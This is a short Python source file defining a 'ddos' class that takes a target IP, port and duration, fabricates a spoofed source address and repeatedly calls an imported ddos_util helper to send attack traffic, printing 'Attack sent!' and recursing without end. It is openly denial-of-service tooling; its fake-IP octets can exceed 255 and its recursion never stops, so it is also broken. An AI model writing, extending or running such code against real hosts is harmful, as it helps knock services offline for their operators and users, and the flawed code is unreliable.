import random
from .utilities.ddos_utils import ddos_util

class ddos:
    def __init__(self, IP: str, PORT: int, duration: int):
        ip1 = random.randint(100, 999)
        ip2 = random.randint(10, 999)
        ip3 = random.randint(10, 999)
        ip4 = random.randint(10, 999)
        self.fake_ip = f"{ip1}.{ip2}.{ip3}.{ip4}"
        self.duration = duration
        self.IP = IP
        self.PORT = PORT
     
    def start(self):
        for i in range(self.duration):
            ddos_util(IP=self.IP, PORT=self.PORT, fake_ip=self.fake_ip)
            print("Attack sent!")
        self.start()
